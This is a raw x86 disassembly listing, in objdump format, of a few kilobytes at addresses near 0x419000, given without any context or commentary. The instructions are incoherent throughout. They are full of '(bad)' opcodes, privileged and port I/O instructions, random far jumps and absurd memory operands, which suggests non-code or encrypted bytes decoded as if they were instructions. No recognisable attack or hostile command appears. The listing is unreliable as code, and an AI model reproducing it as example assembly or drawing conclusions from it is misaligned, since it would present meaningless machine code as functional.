  41947a:	cmc    
  41947b:	lahf   
  41947c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41947d:	test   al,0x64
  41947f:	mov    ecx,ebp
  419481:	test   al,0xc
  419483:	jnp    0x4194b1
  419485:	inc    edx
  419486:	loopne 0x41941b
  419488:	hlt    
  419489:	jmp    0x12d3fdc3
  41948e:	xchg   esi,eax
  41948f:	inc    ebp
  419490:	adc    edx,DWORD PTR [esi+0x4a4ce2c2]
  419496:	and    esp,DWORD PTR [eax-0x1451e5fc]
  41949c:	inc    edi
  41949d:	sbb    eax,0xcaa8bfe1
  4194a2:	mov    eax,0x60ff47b6
  4194a7:	call   0x7b8fc1c0
  4194ac:	mov    al,ch
  4194ae:	loop   0x41943e
  4194b0:	mov    bh,BYTE PTR ds:0x45b272c7
  4194b6:	inc    ebp
  4194b7:	mov    ch,dl
  4194b9:	out    dx,eax
  4194ba:	pushf  
  4194bb:	popa   
  4194bc:	pop    es
  4194bd:	mov    ds:0x3d177a7e,al
  4194c2:	aad    0xae
  4194c4:	adc    edi,esi
  4194c6:	xor    DWORD PTR ds:0xebe57a17,ecx
  4194cc:	xor    edx,DWORD PTR [edi-0x59]
  4194cf:	test   BYTE PTR [ebx],ah
  4194d1:	adc    al,0xfb
  4194d3:	xchg   edi,eax
  4194d4:	pop    esi
  4194d5:	sbb    ax,0xc72
  4194d9:	cmp    DWORD PTR [ebx],edx
  4194db:	int3   
  4194dc:	dec    esp
  4194dd:	mov    cl,BYTE PTR [ecx-0x11fd89ef]
  4194e3:	mov    ds:0x5e3ee3f5,al
  4194e8:	add    DWORD PTR [eax+eiz*2],edx
  4194eb:	in     al,dx
  4194ec:	inc    DWORD PTR [esi+0x33]
  4194ef:	std    
  4194f0:	dec    esp
  4194f1:	in     eax,0xed
  4194f3:	in     al,dx
  4194f4:	(bad)  
  4194f5:	sqrtps xmm0,XMMWORD PTR [edi]
  4194f8:	fdiv   DWORD PTR [ebx+0x27]
  4194fb:	in     al,0x9e
  4194fd:	cmp    BYTE PTR [ebp-0x68],ah
  419500:	sbb    eax,0xaa1cf70
  419505:	sub    BYTE PTR ds:0x20ad92de,0x36
  41950c:	test   ebp,ebp
  41950e:	(bad)  [edi+0x3c]
  419511:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419512:	stos   BYTE PTR es:[edi],al
  419513:	jnp    0x419585
  419515:	shl    DWORD PTR [eax-0x6899f61e],cl
  41951b:	jecxz  0x41956b
  41951d:	repz mov ch,0x3c
  419520:	xor    al,0x4
  419522:	les    ebx,FWORD PTR [edi+0x22ae0df8]
  419528:	jae    0x41956f
  41952a:	aam    0x1b
  41952c:	sub    al,0xd0
  41952e:	xor    al,0xd
  419530:	xchg   edi,eax
  419531:	in     eax,0x37
  419533:	xchg   esp,eax
  419534:	mov    ds:0x5776f739,eax
  419539:	int3   
  41953a:	add    DWORD PTR [edi+ebp*8+0x71c0c507],0xffffffa1
  419542:	nop
  419543:	sub    cl,BYTE PTR [esp+eax*8+0x71]
  419547:	lods   al,BYTE PTR ds:[esi]
  419548:	hlt    
  419549:	call   0xf9ac4453
  41954e:	mov    eax,0x71d344b9
  419553:	jp     0x4195b6
  419555:	inc    ebx
  419556:	(bad)  
  419557:	xor    eax,0xe2cc5106
  41955c:	cmp    bh,BYTE PTR [edx]
  41955e:	iret   
  41955f:	idiv   BYTE PTR [esi]
  419561:	test   eax,0x9ebd7e59
  419566:	xor    al,bl
  419568:	add    al,0x65
  41956a:	jp     0x419518
  41956c:	in     eax,dx
  41956d:	adc    ch,BYTE PTR [ebp-0x78]
  419570:	cli    
  419571:	xchg   edx,eax
  419572:	shld   DWORD PTR [edi-0x56b3a70c],esi,cl
  419579:	mov    dh,0x32
  41957b:	stos   DWORD PTR es:[edi],eax
  41957c:	inc    eax
  41957d:	adc    al,0x17
  41957f:	int3   
  419580:	jp     0x41952a
  419582:	lea    ebx,[ecx+0x6c]
  419585:	sti    
  419586:	mov    cl,0x7
  419588:	jb     0x419560
  41958a:	test   DWORD PTR [edi],0x1532346c
  419590:	mov    ebp,0x8c333f53
  419595:	sub    DWORD PTR [eax],edx
  419597:	pop    ebp
  419598:	and    BYTE PTR [edx+eax*4+0x52],0xac
  41959d:	gs mov ch,0x4c
  4195a0:	mov    esp,0xf4f8bc35
  4195a5:	gs sub al,ah
  4195a8:	jge    0x4195ac
  4195aa:	retf   0xe7a0
  4195ad:	dec    ecx
  4195ae:	push   0xd6ca481d
  4195b3:	mov    bl,0xca
  4195b5:	jge    0x4195e2
  4195b7:	rol    DWORD PTR [ebp-0x22b6dbf3],1
  4195bd:	push   ds
  4195be:	push   cs
  4195bf:	mov    dh,0x21
  4195c1:	test   DWORD PTR [ebx-0x7f],0x320cbd81
  4195c8:	xor    eax,0x91e4e966
  4195cd:	in     al,0x48
  4195cf:	inc    esp
  4195d0:	call   0xe651:0x8dab70b1
  4195d7:	mov    ah,0xb8
  4195d9:	jne    0x4195c5
  4195db:	mov    al,ds:0xdadb9b16
  4195e0:	test   al,0x19
  4195e2:	and    BYTE PTR [eax],0x20
  4195e5:	mov    ebx,eax
  4195e7:	neg    DWORD PTR [ecx+0x30]
  4195ea:	jo     0x41962c
  4195ec:	pop    ebx
  4195ed:	lds    edi,FWORD PTR [esi+edi*8]
  4195f0:	mul    DWORD PTR [edx+0x2f2759cb]
  4195f6:	mov    dl,0xcd
  4195f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195f9:	adc    eax,ecx
  4195fb:	call   0xba9737c7
  419600:	cmc    
  419601:	xor    esi,DWORD PTR [ebx*2+0x65790b33]
  419608:	test   BYTE PTR [edx-0x93e4f3],0x23
  41960f:	(bad)  
  419610:	sbb    BYTE PTR [ebp+0x41eef5e6],ah
  419616:	adc    BYTE PTR [ebx],al
  419618:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41961a:	loop   0x41963b
  41961c:	sbb    ch,BYTE PTR [esi]
  41961e:	inc    edi
  41961f:	shr    DWORD PTR [eax],cl
  419621:	popf   
  419622:	fsubr  QWORD PTR [edx+0x57672abf]
  419628:	hlt    
  419629:	dec    esp
  41962a:	ds push edx
  41962c:	repz repnz pop es
  41962f:	outs   dx,DWORD PTR ds:[esi]
  419630:	lahf   
  419631:	leave  
  419632:	int3   
  419633:	push   ss
  419634:	push   ebp
  419635:	in     al,dx
  419636:	aam    0xc9
  419638:	sbb    eax,0x92b16ecf
  41963d:	out    0xe8,eax
  41963f:	call   0xe6db:0xa29c9c2
  419646:	and    al,0xc7
  419648:	push   ds
  419649:	dec    ebx
  41964a:	cdq    
  41964b:	out    dx,al
  41964c:	mov    eax,ds
  41964e:	xchg   edi,eax
  41964f:	mov    edx,DWORD PTR [eax]
  419651:	ss mov bl,0x2b
  419654:	add    cl,cl
  419656:	fwait
  419657:	and    BYTE PTR [ebx-0x1d],ah
  41965a:	clc    
  41965b:	in     al,dx
  41965c:	jo     0x41966d
  41965e:	push   ebx
  41965f:	loop   0x419630
  419661:	mov    ds:0x17d72a7a,eax
  419666:	ins    DWORD PTR es:[edi],dx
  419667:	retf   
  419668:	pop    ebx
  419669:	ds das 
  41966b:	pop    ds
  41966c:	dec    ebx
  41966d:	rol    BYTE PTR [edi],1
  41966f:	push   ebx
  419670:	xor    al,0x60
  419672:	js     0x4195fc
  419674:	push   esi
  419675:	jnp    0x4196df
  419677:	sub    DWORD PTR [ebp+0x38],esi
  41967a:	mov    cl,0x0
  41967c:	mov    ebp,0x9e283e1e
  419681:	in     eax,0xd2
  419683:	xchg   DWORD PTR [ecx-0x5f50756],esi
  419689:	pop    es
  41968a:	out    0x4b,al
  41968c:	icebp  
  41968d:	data16 (bad) 
  41968f:	jns    0x419682
  419691:	xor    eax,0xcbec9d7e
  419696:	cmp    BYTE PTR [ebp+0x36e7e743],0x13
  41969d:	inc    edx
  41969e:	(bad)  
  41969f:	adc    edi,DWORD PTR [eax-0x3f]
  4196a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196a3:	cdq    
  4196a4:	scas   eax,DWORD PTR es:[edi]
  4196a5:	or     DWORD PTR [esi],ebx
  4196a7:	or     al,0x3e
  4196a9:	mov    ?,WORD PTR [edx-0x582e0107]
  4196af:	(bad)  
  4196b0:	dec    ecx
  4196b1:	and    eax,0x612ec131
  4196b6:	fcomp  QWORD PTR [edi]
  4196b8:	inc    esp
  4196b9:	fwait
  4196ba:	adc    eax,0x9317f29b
  4196bf:	inc    eax
  4196c0:	jns    0x41967a
  4196c2:	(bad)  
  4196c3:	jp     0x419700
  4196c5:	jge    0x41966d
  4196c7:	retf   0x9dc4
  4196ca:	mov    WORD PTR [ebp-0x67],ds
  4196cd:	inc    eax
  4196ce:	mov    BYTE PTR [ebp+0x9],ah
  4196d1:	outs   dx,DWORD PTR ds:[esi]
  4196d2:	xor    eax,0x787fd37c
  4196d7:	fisub  DWORD PTR [ebx+0x4c5c6475]
  4196dd:	pop    es
  4196de:	sbb    BYTE PTR [ebp+0x593a7989],ch
  4196e4:	je     0x419720
  4196e6:	cld    
  4196e7:	or     al,0xa7
  4196e9:	add    al,0xb3
  4196eb:	mov    dl,0xc0
  4196ed:	pop    edx
  4196ee:	les    ecx,FWORD PTR [ebp+0x66]
  4196f1:	aas    
  4196f2:	mov    ecx,0xa2bc40b2
  4196f7:	xor    ebx,DWORD PTR ds:0x9812956f
  4196fd:	adc    ah,ah
  4196ff:	push   eax
  419700:	jmp    0x4196b3
  419702:	scas   al,BYTE PTR es:[edi]
  419703:	retf   
  419704:	jbe    0x419703
  419706:	fidiv  WORD PTR [esi+edi*1]
  419709:	adc    eax,0x76e14d3e
  41970e:	fxch   st(5)
  419710:	rol    BYTE PTR [ebx],cl
  419712:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419713:	iret   
  419714:	or     DWORD PTR [ebx-0x5793fb3],ebx
  41971a:	xchg   ebp,eax
  41971b:	outs   dx,DWORD PTR ds:[esi]
  41971c:	cmc    
  41971d:	mov    ds:0x1900e4ce,al
  419722:	sbb    al,0x6b
  419724:	xchg   ebp,eax
  419725:	cmp    eax,0x461fd311
  41972a:	popa   
  41972b:	jb     0x4196eb
  41972d:	add    al,0xb8
  41972f:	jecxz  0x4196b3
  419731:	dec    esi
  419732:	out    0x24,eax
  419734:	stos   BYTE PTR es:[edi],al
  419735:	mov    eax,ds:0xab04f958
  41973a:	jg     0x41975d
  41973c:	leave  
  41973d:	mov    ah,0x72
  41973f:	mov    eax,0xc8166ccc
  419744:	xchg   esp,eax
  419745:	test   al,0x2d
  419747:	je     0x419723
  419749:	jb     0x41976d
  41974b:	enter  0x6fee,0xaf
  41974f:	or     cl,BYTE PTR [ebp+eax*1-0xddcdfd8]
  419756:	cli    
  419757:	(bad)  
  419758:	push   ebp
  419759:	mov    eax,0x259ed4f0
  41975e:	iret   
  41975f:	das    
  419760:	lods   al,BYTE PTR ds:[esi]
  419761:	xchg   ecx,eax
  419762:	fnsetpm(287 only) 
  419764:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419765:	push   eax
  419766:	pop    edx
  419767:	cmp    bh,dh
  419769:	daa    
  41976a:	in     al,0xa0
  41976c:	jle    0x419708
  41976e:	mov    esp,0x5130e5f8
  419773:	bnd jge 0x41975c
  419776:	push   ebp
  419777:	outs   dx,BYTE PTR cs:[esi]
  419779:	sbb    bh,al
  41977b:	sar    dh,cl
  41977d:	(bad)  
  41977e:	out    0xbf,eax
  419780:	dec    ebp
  419781:	stos   BYTE PTR es:[edi],al
  419782:	jns    0x41976a
  419784:	mov    ebp,0x752f7165
  419789:	add    ecx,ecx
  41978b:	push   ecx
  41978c:	xchg   esp,eax
  41978d:	int    0x40
  41978f:	gs or  cl,dh
  419792:	inc    esi
  419793:	cmp    esi,DWORD PTR [edx-0x7bfe21c0]
  419799:	stos   BYTE PTR es:[edi],al
  41979a:	adc    al,0xf7
  41979c:	push   ss
  41979d:	push   esp
  41979e:	adc    al,0xa8
  4197a0:	jae    0x41978f
  4197a2:	pop    ss
  4197a3:	xchg   BYTE PTR [ecx],ch
  4197a5:	mov    edx,0xae1f575b
  4197aa:	imul   edx,ecx,0xffffffb0
  4197ad:	jnp    0x4197eb
  4197af:	ret    
  4197b0:	(bad)  
  4197b1:	ins    DWORD PTR es:[edi],dx
  4197b2:	cmc    
  4197b3:	mov    ss,eax
  4197b5:	js     0x4197db
  4197b7:	sbb    BYTE PTR [eax+0xf],dh
  4197ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197bb:	or     BYTE PTR [ecx],bl
  4197bd:	dec    edi
  4197be:	xchg   ebx,eax
  4197bf:	loope  0x4197c9
  4197c1:	cmp    ebp,DWORD PTR [ebx-0x7c9aea72]
  4197c7:	add    esi,DWORD PTR [esi+0x4c]
  4197ca:	and    al,0x35
  4197cc:	out    0x9f,al
  4197ce:	cmp    esi,ebp
  4197d0:	cmc    
  4197d1:	call   DWORD PTR [ebp+0x793fd274]
  4197d7:	les    ebx,FWORD PTR [edi]
  4197d9:	int    0xe2
  4197db:	mov    al,0x39
  4197dd:	pop    edx
  4197de:	cli    
  4197df:	aas    
  4197e0:	lock enter 0xe47b,0xcf
  4197e5:	dec    edi
  4197e6:	xchg   ebx,eax
  4197e7:	and    ch,BYTE PTR [ebp-0x4a47a2e5]
  4197ed:	cmp    eax,0xfbf1a0b7
  4197f2:	xor    al,0x25
  4197f4:	push   ebx
  4197f5:	test   eax,0x1f839f6d
  4197fa:	add    BYTE PTR [eax-0x7b],bl
  4197fd:	fld    st(3)
  4197ff:	retf   0x8da
  419802:	dec    ecx
  419803:	mov    dh,0x3e
  419805:	jle    0x4197da
  419807:	popa   
  419808:	retf   
  419809:	popf   
  41980a:	mov    ds:0x6ab92564,eax
  41980f:	add    ebx,DWORD PTR [ebx+0x30f93d2e]
  419815:	inc    ebp
  419816:	jg     0x419812
  419818:	jne    0x419899
  41981a:	outs   dx,BYTE PTR ds:[esi]
  41981b:	into   
  41981c:	pushf  
  41981d:	sub    DWORD PTR [esi-0x7259f89a],0x93a8e727
  419827:	inc    esp
  419828:	test   eax,0x5f87bf46
  41982d:	sub    BYTE PTR [ebp-0x7a],ah
  419830:	adc    eax,0xb17bdbd0
  419835:	dec    esp
  419836:	or     BYTE PTR [ebx],bh
  419838:	ja     0x41988d
  41983a:	pop    edx
  41983b:	repnz mov esp,0xf4b185af
  419841:	mov    bl,0x75
  419843:	push   esp
  419844:	push   edi
  419845:	pop    ebp
  419846:	dec    edi
  419847:	dec    ecx
  419848:	in     al,0xa7
  41984a:	outs   dx,BYTE PTR ds:[esi]
  41984b:	xlat   BYTE PTR ds:[ebx]
  41984c:	sub    esp,DWORD PTR [ebp-0x17392c7a]
  419852:	out    dx,al
  419853:	inc    ebp
  419854:	arpl   WORD PTR [edx+eax*4+0x4],dx
  419858:	xchg   edx,eax
  419859:	and    BYTE PTR [esi-0x4b878956],dl
  41985f:	add    al,0x5b
  419861:	scas   eax,DWORD PTR es:[edi]
  419862:	push   edi
  419863:	dec    ebp
  419864:	int3   
  419865:	imul   edx,DWORD PTR [ecx],0x758dcd42
  41986b:	dec    ecx
  41986c:	add    DWORD PTR ds:0x3610fcea,edi
  419872:	lahf   
  419873:	dec    eax
  419874:	push   cs
  419875:	outs   dx,BYTE PTR ss:[esi]
  419877:	cdq    
  419878:	xor    DWORD PTR [edi],ecx
  41987a:	dec    eax
  41987b:	mov    edi,es
  41987d:	sbb    DWORD PTR [ecx+0x414aa58b],eax
  419883:	imul   eax,DWORD PTR [ecx+0x675cc303],0xaabd809b
  41988d:	mov    al,ds:0x99695886
  419892:	sub    al,BYTE PTR [edi-0xaba0e43]
  419898:	stc    
  419899:	xchg   BYTE PTR es:[esi-0x31],dl
  41989d:	cmp    DWORD PTR [eax+0x31],edx
  4198a0:	jo     0x4198f4
  4198a2:	sub    DWORD PTR [esi+0x75f313b2],0xffffffcb
  4198a9:	jno    0x419871
  4198ab:	retf   0xd57
  4198ae:	cld    
  4198af:	lods   al,BYTE PTR ds:[esi]
  4198b0:	fs mov esi,0x9b9a4029
  4198b6:	cmc    
  4198b7:	pop    eax
  4198b8:	inc    ecx
  4198b9:	mov    ds:0xfa46805e,al
  4198be:	push   0xffffffb3
  4198c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198c1:	or     al,0x8a
  4198c3:	imul   edx,DWORD PTR [eax-0x1b00011f],0x67
  4198ca:	stc    
  4198cb:	jge    0x419944
  4198cd:	rcl    BYTE PTR [ebp+0x3dbdf8f7],cl
  4198d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198d5:	retf   
  4198d6:	xor    BYTE PTR [edi],bl
  4198d8:	das    
  4198d9:	and    BYTE PTR [esi+0x14],0xcc
  4198dd:	mov    al,0x8
  4198df:	jb     0x4198fd
  4198e1:	lock dec ebx
  4198e3:	mov    eax,ds:0xb25d0abe
  4198e8:	ffreep st(2)
  4198ea:	cmp    DWORD PTR [ebx+0x110ade03],edi
  4198f0:	mov    gs,WORD PTR [ecx]
  4198f2:	jbe    0x419926
  4198f4:	aam    0x63
  4198f6:	inc    ebx
  4198f7:	or     bl,dh
  4198f9:	(bad)  
  4198fa:	ds mov esi,0x4b119171
  419900:	mov    cl,0x4a
  419902:	in     al,0x32
  419904:	push   esp
  419905:	xor    DWORD PTR [ebx],0x9b0bffb2
  41990b:	sub    DWORD PTR [ebp-0x4],eax
  41990e:	push   ss
  41990f:	cmp    ebx,DWORD PTR [edx+0x17]
  419912:	mov    BYTE PTR [eax-0x7],cl
  419915:	icebp  
  419916:	daa    
  419917:	jbe    0x4198c9
  419919:	pop    edx
  41991a:	xor    eax,0x36b0b88c
  41991f:	sbb    ebx,DWORD PTR [eax+0x45b50f8]
  419925:	ret    
  419926:	int3   
  419927:	xor    al,0xd1
  419929:	fldcw  WORD PTR [edx+0x2d83577a]
  41992f:	dec    eax
  419930:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419931:	mov    dl,0x91
	...
  419b0b:	push   0xc
  419b0d:	lea    ebx,[eax-0x1806611]
  419b13:	into   
  419b14:	out    dx,al
  419b15:	popf   
  419b16:	adc    eax,DWORD PTR [edx+edx*4-0x10]
  419b1a:	xchg   ebp,eax
  419b1b:	push   edi
  419b1c:	xchg   esp,eax
  419b1d:	add    DWORD PTR [eax],eax
  419b1f:	and    eax,0xa5000007
  419b24:	loopne 0x419b62
  419b26:	mov    eax,0x73e60d10
  419b2b:	push   eax
  419b2c:	jge    0x419ac1
  419b2e:	into   
  419b2f:	bound  edx,QWORD PTR [edi+0x2c]
  419b32:	outs   dx,DWORD PTR ds:[esi]
  419b33:	push   eax
  419b34:	shl    BYTE PTR [ebp-0x3c],0x68
  419b38:	xor    BYTE PTR [ebx+0x7979cf9d],ch
  419b3e:	mov    ebp,DWORD PTR [eax+0x71]
  419b41:	je     0x419bad
  419b43:	enter  0xf38,0x69
  419b47:	stc    
  419b48:	xor    DWORD PTR [edx+eiz*4],eax
  419b4b:	loope  0x419b76
  419b4d:	data16 sbb al,0x64
  419b50:	jp     0x419ba9
  419b52:	pop    es
  419b53:	dec    ebp
  419b54:	mov    ebp,0x14aa2bb1
  419b59:	daa    
  419b5a:	pop    ebp
  419b5b:	pop    esi
  419b5c:	fwait
  419b5d:	pop    edx
  419b5e:	cmc    
  419b5f:	in     al,dx
  419b60:	adc    dh,BYTE PTR [ecx]
  419b62:	into   
  419b63:	sbb    eax,0x8328e768
  419b68:	jg     0x419b4d
  419b6a:	push   0x51
  419b6c:	outs   dx,BYTE PTR ds:[esi]
  419b6d:	cmp    BYTE PTR [eax+0x32],bh
  419b70:	pop    ebx
  419b71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b72:	mov    ds:0x80e6ee53,eax
  419b77:	iret   
  419b78:	adc    BYTE PTR [eax+0x12e1f50d],ch
  419b7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b7f:	jl     0x419b16
  419b81:	add    eax,0xfb7a4088
  419b86:	mov    al,0x88
  419b88:	lods   al,BYTE PTR ds:[esi]
  419b89:	iret   
  419b8a:	gs sti 
  419b8c:	(bad)  
  419b8d:	sbb    ebp,DWORD PTR [ebp+ecx*2-0x1816bd16]
  419b94:	xchg   esi,eax
  419b95:	pop    es
  419b96:	xchg   edx,eax
  419b97:	inc    ebx
  419b98:	push   edx
  419b99:	stc    
  419b9a:	add    al,0xc8
  419b9c:	inc    ebx
  419b9d:	loopne 0x419bca
  419b9f:	mov    bl,0x4a
  419ba1:	add    ecx,eax
  419ba3:	jbe    0x419b42
  419ba5:	fst    QWORD PTR es:[eax+0x285d2ca3]
  419bac:	in     eax,dx
  419bad:	outs   dx,DWORD PTR ds:[esi]
  419bae:	xor    BYTE PTR [ebx-0xe0d5f72],dl
  419bb4:	out    dx,eax
  419bb5:	aad    0xdc
  419bb7:	mov    DWORD PTR [ebx-0x26],0xad8d434a
  419bbe:	cmp    edi,DWORD PTR [edi]
  419bc0:	or     dh,BYTE PTR [ecx+0x2c]
  419bc3:	lds    ebx,FWORD PTR [ebx-0x25]
  419bc6:	mov    ds:0x9f9252fa,eax
  419bcb:	iret   
  419bcc:	adc    al,BYTE PTR [ebp+0x71]
  419bcf:	mov    eax,ds:0x56479d6c
  419bd4:	iret   
  419bd5:	jmp    0x419bc4
  419bd7:	jmp    0x2d2c:0xc1b3f60f
  419bde:	mov    ds:0x300abdbb,eax
  419be3:	inc    eax
  419be4:	ins    DWORD PTR es:[edi],dx
  419be5:	pop    ebp
  419be6:	cwde   
  419be7:	ret    0xb3ac
  419bea:	sub    al,0x9a
  419bec:	dec    ebx
  419bed:	jmp    0xe677:0x9be502b0
  419bf4:	mov    ch,0x5
  419bf6:	add    DWORD PTR ds:0x547bc17f,ebp
  419bfc:	mov    al,0x69
  419bfe:	mov    ds:0xb20edf9c,al
  419c03:	pusha  
  419c04:	cmp    DWORD PTR [ebx-0x79ec0b68],edi
  419c0a:	pop    ss
  419c0b:	push   ss
  419c0c:	test   BYTE PTR [ecx+0x76e9e43d],dl
  419c12:	(bad)  
  419c13:	and    eax,esp
  419c15:	scas   al,BYTE PTR es:[edi]
  419c16:	fdiv   QWORD PTR [eax+esi*8-0x33b8df8a]
  419c1d:	add    ecx,edx
  419c1f:	jecxz  0x419c28
  419c21:	jecxz  0x419bf2
  419c23:	cmp    ebx,DWORD PTR [ecx]
  419c25:	and    al,0xb3
  419c28:	jmp    0x1e16:0x5ed92f64
  419c2f:	int3   
  419c30:	sub    eax,0xa030e30c
  419c35:	(bad)  
  419c36:	imul   ebx,DWORD PTR [ebp-0x68],0x68358cc7
  419c3d:	push   edx
  419c3e:	or     BYTE PTR [ebp-0x6b],cl
  419c41:	icebp  
  419c42:	or     al,0x36
  419c44:	push   ss
  419c45:	lods   al,BYTE PTR ds:[esi]
  419c46:	pop    ds
  419c47:	stos   BYTE PTR es:[edi],al
  419c48:	icebp  
  419c49:	arpl   WORD PTR ds:0xb7f3c58c,si
  419c4f:	push   es
  419c50:	lea    edi,[ebp+0x42889884]
  419c56:	loopne 0x419c04
  419c58:	loope  0x419ca9
  419c5a:	push   ebx
  419c5b:	inc    eax
  419c5c:	mov    ebx,0xc31e302c
  419c61:	cwde   
  419c62:	xchg   edx,eax
  419c63:	push   ss
  419c64:	or     eax,0xbf8cd8ab
  419c69:	mov    DWORD PTR [edx-0x45],0x3dc04ff9
  419c70:	add    DWORD PTR es:[ebx-0x24],edi
  419c74:	mov    ?,ebx
  419c76:	int    0xdd
  419c78:	xchg   DWORD PTR [ecx-0x32d3ed6d],esp
  419c7e:	xor    BYTE PTR [ebx+0x229ff113],0x59
  419c85:	and    ebp,DWORD PTR [esp+eiz*2]
  419c88:	outs   dx,BYTE PTR ds:[esi]
  419c89:	or     ecx,ecx
  419c8b:	inc    esi
  419c8c:	jl     0x419ccb
  419c8e:	xchg   esp,eax
  419c8f:	cs dec esp
  419c91:	sub    edi,DWORD PTR [eax+0x14a325e4]
  419c97:	sub    dh,BYTE PTR [eax]
  419c99:	or     eax,0x71d8e39e
  419c9e:	inc    ebx
  419c9f:	add    BYTE PTR ds:0xbb0befee,al
  419ca5:	outs   dx,BYTE PTR ds:[esi]
  419ca6:	std    
  419ca7:	mov    esi,cr2
  419caa:	add    ah,bl
  419cac:	mov    dh,0xef
  419cae:	out    0x67,al
  419cb0:	sbb    al,0x76
  419cb2:	xor    al,0xfe
  419cb4:	mov    ebp,esi
  419cb6:	xchg   ecx,eax
  419cb7:	mov    cl,0x6f
  419cb9:	sub    dh,BYTE PTR [eax]
  419cbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cbc:	jp     0x419cba
  419cbe:	repz popf 
  419cc0:	or     bl,BYTE PTR [esi+0x5e]
  419cc3:	sbb    BYTE PTR [eax],dh
  419cc5:	add    dh,BYTE PTR [edx+eiz*1+0x826830e]
  419ccc:	out    dx,al
  419ccd:	pop    edi
  419cce:	test   DWORD PTR [ebp-0x6c],esi
  419cd1:	mov    bl,ch
  419cd3:	in     al,dx
  419cd4:	mov    ecx,0x1ed3ba4f
  419cd9:	mov    esp,0x16cb699d
  419cde:	inc    eax
  419cdf:	test   DWORD PTR [edi-0x173cf70d],esi
  419ce5:	popa   
  419ce6:	jmp    0x8f2369ba
  419ceb:	sbb    al,0x4e
  419ced:	out    0x21,al
  419cef:	xchg   ecx,eax
  419cf0:	outs   dx,BYTE PTR ds:[esi]
  419cf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419cf2:	adc    bh,BYTE PTR [ebx+0x190b9c0e]
  419cf8:	je     0x419ceb
  419cfa:	(bad)  
  419cfb:	fcom   QWORD PTR [ebx+0x73]
  419cfe:	outs   dx,BYTE PTR ds:[esi]
  419cff:	mov    ebp,0xd752f470
  419d04:	adc    eax,0x6f2750e4
  419d09:	icebp  
  419d0a:	xchg   ebp,eax
  419d0b:	div    DWORD PTR [esi-0x6a4e14c6]
  419d11:	aad    0xea
  419d13:	adc    eax,0xc6615116
  419d18:	test   BYTE PTR [eax],al
  419d1a:	(bad)  
  419d1b:	adc    ecx,DWORD PTR [edx+0x6d0846fb]
  419d21:	arpl   WORD PTR [eax+0x0],cx
  419d24:	mov    dl,0x81
  419d26:	pop    DWORD PTR [edi-0x686ba7b7]
  419d2c:	dec    edi
  419d2d:	cwde   
  419d2e:	mov    ecx,0xe847e64
  419d33:	in     al,dx
  419d34:	nop
  419d35:	ins    BYTE PTR es:[edi],dx
  419d36:	sub    bh,bl
  419d38:	scas   eax,DWORD PTR es:[edi]
  419d39:	and    DWORD PTR [edi+0x73cbd435],esp
  419d3f:	or     eax,DWORD PTR [ebp-0x14]
  419d42:	fs push ds
  419d44:	mov    al,0x62
  419d46:	ret    
  419d47:	popa   
  419d48:	clc    
  419d49:	jp     0x419d47
  419d4b:	cli    
  419d4c:	inc    edi
  419d4d:	or     cl,BYTE PTR [edx+0x1bfb061e]
  419d53:	xchg   edx,eax
  419d54:	mov    ebx,DWORD PTR [eax-0x62a0f98]
  419d5a:	jmp    0x7648d161
  419d5f:	loop   0x419da4
  419d61:	jmp    0x4a287bb9
  419d66:	fs fxch st(5)
  419d69:	xlat   BYTE PTR ds:[ebx]
  419d6a:	mov    ch,BYTE PTR [edi-0x370c3502]
  419d70:	ds add cl,dh
  419d73:	ja     0x419db9
  419d75:	int    0xb4
  419d77:	fs scas eax,DWORD PTR es:[edi]
  419d79:	jbe    0x419d7e
  419d7b:	test   BYTE PTR [esi-0x1d646af2],ah
  419d81:	test   DWORD PTR [esi+0x6ee9784],eax
  419d87:	pop    ebx
  419d88:	mov    dh,0x11
  419d8a:	add    dl,0xa6
  419d8d:	cwde   
  419d8e:	lahf   
  419d8f:	jl     0x419e02
  419d91:	or     eax,0x62deb089
  419d96:	pop    ebp
  419d97:	ins    DWORD PTR es:[edi],dx
  419d98:	and    eax,0x96ab0515
  419d9d:	loop   0x419dad
  419d9f:	js     0x419ddd
  419da1:	xchg   edi,eax
  419da2:	add    cl,BYTE PTR ds:0x229557a6
  419da8:	xor    BYTE PTR [ebp-0x14],dl
  419dab:	add    BYTE PTR [esp+edi*1],cl
  419dae:	mov    dl,0xa3
  419db0:	sbb    edx,DWORD PTR [ebp-0x22]
  419db3:	test   DWORD PTR [esi+esi*2-0x68],esp
  419db7:	(bad)  
  419db8:	jp     0x419d59
  419dba:	rol    dh,1
  419dbc:	cmp    dh,BYTE PTR [ecx+0x3b]
  419dbf:	ror    esi,1
  419dc1:	(bad)  
  419dc2:	lock mov DWORD PTR [bp+di],esi
  419dc6:	nop
  419dc7:	xchg   esp,eax
  419dc8:	jne    0x419dd0
  419dca:	outs   dx,BYTE PTR ds:[esi]
  419dcb:	in     eax,dx
  419dcc:	and    eax,0x5e97e249
  419dd1:	pop    edi
  419dd2:	add    DWORD PTR [ecx+0x67],edx
  419dd5:	lock or al,0x94
  419dd8:	cdq    
  419dd9:	push   esp
  419dda:	push   eax
  419ddb:	inc    ecx
  419ddc:	jg     0x419e02
  419dde:	ret    0x20c0
  419de1:	xchg   edx,eax
  419de2:	mov    al,ds:0x8919b886
  419de7:	and    DWORD PTR [esi+0x454a6406],ebp
  419ded:	xchg   esi,eax
  419dee:	mov    bh,0x84
  419df0:	and    cl,dh
  419df2:	inc    edi
  419df3:	sbb    cl,BYTE PTR [eax-0x75]
  419df6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419df7:	call   ebp
  419df9:	(bad)  
  419dfa:	pop    ebx
  419dfb:	popf   
  419dfc:	jns    0x419e24
